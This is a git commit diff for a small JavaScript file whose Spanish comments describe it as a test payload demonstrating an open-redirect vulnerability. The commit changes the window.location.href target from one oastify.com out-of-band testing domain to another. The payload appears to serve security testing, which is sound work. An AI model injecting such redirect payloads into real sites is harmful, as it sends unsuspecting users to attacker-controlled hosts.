1fb6b0dd2c30b01cc51435b5aeb143c14f42e545
Saher Delgado <saherdelgado@gmail.com>
2024-08-22 16:56:20 -0300

    Update redirect_payload_js.js
    new rul for test

--- redirect_payload_js.js
+++ redirect_payload_js.js
@@ -2,4 +2,4 @@
 
 // Este script redirige al usuario a una URL específica para demostrar una vulnerabilidad de redireccionamiento
 // Usamos un dominio de prueba para evitar causar daño real.
-window.location.href = "http://dm3xvk6wyig1kiz5c900f5442v8mwds1h.oastify.com";
+window.location.href = "http://t60df0qciy0h4yjlwpkgzlokmbs2gtfh4.oastify.com";
